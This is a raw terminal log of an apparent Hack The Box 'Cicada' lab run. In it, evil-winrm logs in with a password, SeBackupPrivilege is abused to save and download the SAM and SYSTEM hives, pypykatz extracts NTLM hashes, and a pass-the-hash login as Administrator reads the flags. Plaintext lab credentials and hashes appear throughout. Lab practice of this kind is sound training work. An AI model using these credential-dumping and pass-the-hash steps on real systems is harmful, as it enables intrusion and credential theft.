
```
 [~/Desktop/HTB/windows/Cicada]
 perplex  sudo gem install evil-winrm

Fetching multi_json-1.15.0.gem
Fetching builder-3.3.0.gem
Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.5.gem
Fetching logging-2.4.0.gem
Fetching httpclient-2.9.0.gem
Fetching gyoku-1.4.0.gem
Fetching nori-2.7.1.gem
Fetching evil-winrm-3.7.gem
Fetching ffi-1.17.2-x86_64-linux-gnu.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.13.1.gem
Fetching winrm-2.3.9.gem
Fetching rubyzip-2.4.1.gem
Fetching winrm-fs-1.3.5.gem
Successfully installed rubyntlm-0.6.5
Successfully installed nori-2.7.1
Successfully installed multi_json-1.15.0
Successfully installed little-plugger-1.1.4
Successfully installed logging-2.4.0
Successfully installed httpclient-2.9.0
Successfully installed builder-3.3.0
Successfully installed gyoku-1.4.0
Successfully installed ffi-1.17.2-x86_64-linux-gnu
Successfully installed gssapi-1.3.1
Successfully installed erubi-1.13.1
Successfully installed winrm-2.3.9
RubyZip 3.0 is coming!
**********************

The public API of some Rubyzip classes has been modernized to use named
parameters for optional arguments. Please check your usage of the
following classes:
  * `Zip::File`
  * `Zip::Entry`
  * `Zip::InputStream`
  * `Zip::OutputStream`
  * `Zip::DOSTime`

Run your test suite with the `RUBYZIP_V3_API_WARN` environment
variable set to see warnings about usage of the old API. This will
help you to identify any changes that you need to make to your code.
See https://github.com/rubyzip/rubyzip/wiki/Updating-to-version-3.x for
more information.

Please ensure that your Gemfiles and .gemspecs are suitably restrictive
to avoid an unexpected breakage when 3.0 is released (e.g. ~> 2.3.0).
See https://github.com/rubyzip/rubyzip for details. The Changelog also
lists other enhancements and bugfixes that have been implemented since
version 2.3.0.
Successfully installed rubyzip-2.4.1
Successfully installed winrm-fs-1.3.5
Happy hacking! :)
Successfully installed evil-winrm-3.7
Parsing documentation for rubyntlm-0.6.5
Installing ri documentation for rubyntlm-0.6.5
Parsing documentation for nori-2.7.1
Installing ri documentation for nori-2.7.1
Parsing documentation for multi_json-1.15.0
Installing ri documentation for multi_json-1.15.0
Parsing documentation for little-plugger-1.1.4
Installing ri documentation for little-plugger-1.1.4
Parsing documentation for logging-2.4.0
Installing ri documentation for logging-2.4.0
Parsing documentation for httpclient-2.9.0
Installing ri documentation for httpclient-2.9.0
Parsing documentation for builder-3.3.0
Installing ri documentation for builder-3.3.0
Parsing documentation for gyoku-1.4.0
Installing ri documentation for gyoku-1.4.0
Parsing documentation for ffi-1.17.2-x86_64-linux-gnu
Installing ri documentation for ffi-1.17.2-x86_64-linux-gnu
Parsing documentation for gssapi-1.3.1
Installing ri documentation for gssapi-1.3.1
Parsing documentation for erubi-1.13.1
Installing ri documentation for erubi-1.13.1
Parsing documentation for winrm-2.3.9
Installing ri documentation for winrm-2.3.9
Parsing documentation for rubyzip-2.4.1
Installing ri documentation for rubyzip-2.4.1
Parsing documentation for winrm-fs-1.3.5
Installing ri documentation for winrm-fs-1.3.5
Parsing documentation for evil-winrm-3.7
Installing ri documentation for evil-winrm-3.7
Done installing documentation for rubyntlm, nori, multi_json, little-plugger, logging, httpclient, builder, gyoku, ffi, gssapi, erubi, winrm, rubyzip, winrm-fs, evil-winrm after 3 seconds
15 gems installed
               
 [~/Desktop/HTB/windows/Cicada]
 perplex  
               
 [~/Desktop/HTB/windows/Cicada]
 perplex  evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: Check your /etc/hosts file to ensure you can resolve cicada.htb
                                        
Error: Exiting with code 1
               
 [~/Desktop/HTB/windows/Cicada]
 ✘  perplex  























               
 [~/Desktop/HTB/windows/Cicada]
 ✘  perplex  evil-winrm -i 10.129.237.248 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 





























*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ls
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> ls


    Directory: C:\Users\emily.oscars.CICADA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/4/2025   4:47 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
6a0b775954a07aa4393ffded47cbf614
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /all


USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam c:\temp\sam
reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> start-process powershell -verb runAs
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg query hklm\sam

HKEY_LOCAL_MACHINE\sam\SAM
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system c:\temp\system
reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> psexec -s -i cmd.exe

The term 'psexec' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ psexec -s -i cmd.exe
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (psexec:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
















*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam c:\temp\sam

reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ifconfig }
The term 'ifconfig' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ ifconfig
+ ~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (ifconfig:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ipconfig | findstr /i ipv4

   IPv4 Address. . . . . . . . . . . : 10.129.237.248
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cd ~
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\sam to sam

                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\sam c:\temp\sam

reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> download sam
                                        
Info: Downloading C:\Users\emily.oscars.CICADA\sam to sam
                                        
Error: Download failed. Check filenames or paths
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> reg save hklm\sam c:\temp\sam
reg.exe : ERROR: The system was unable to find the specified registry key or value.
    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> 
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd ~
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd C:\
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows


*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/4/2025   4:16 PM                Temp


*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/22/2024  11:45 AM                PerfLogs
d-r---         8/29/2024  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----         3/14/2024   5:21 AM                Shares
d-----          5/4/2025   4:16 PM                Temp
d-r---         8/26/2024   1:11 PM                Users
d-----         9/23/2024   9:35 AM                Windows


*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2025   4:16 PM          49152 sam
-a----          5/4/2025   4:17 PM       18546688 system


*Evil-WinRM* PS C:\Temp> download sam
                                        
Info: Downloading C:\Temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system
                                        
Info: Downloading C:\Temp\system to system
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> 

```


```
 [~/Desktop/HTB/windows/Cicada]
 perplex  pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

               
 [~/Desktop/HTB/windows/Cicada]
 perplex  evil-winrm -i cicada.htb -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: Check your /etc/hosts file to ensure you can resolve cicada.htb
                                        
Error: Exiting with code 1
               
 [~/Desktop/HTB/windows/Cicada]
 ✘  perplex  evil-winrm -i 10.129.237.248 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/14/2024  10:20 PM                WindowsPowerShell


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/14/2024   3:45 AM                3D Objects
d-r---         3/14/2024   3:45 AM                Contacts
d-r---         8/30/2024  10:06 AM                Desktop
d-r---         3/14/2024  10:20 PM                Documents
d-r---         3/14/2024   3:45 AM                Downloads
d-r---         3/14/2024   3:45 AM                Favorites
d-r---         3/14/2024   3:45 AM                Links
d-r---         3/14/2024   3:45 AM                Music
d-r---         3/14/2024   3:45 AM                Pictures
d-r---         3/14/2024   3:45 AM                Saved Games
d-r---         3/14/2024   3:45 AM                Searches
d-r---         3/14/2024   3:45 AM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          5/4/2025   4:47 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e31c9a153c06b498db541297ea37d14f
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

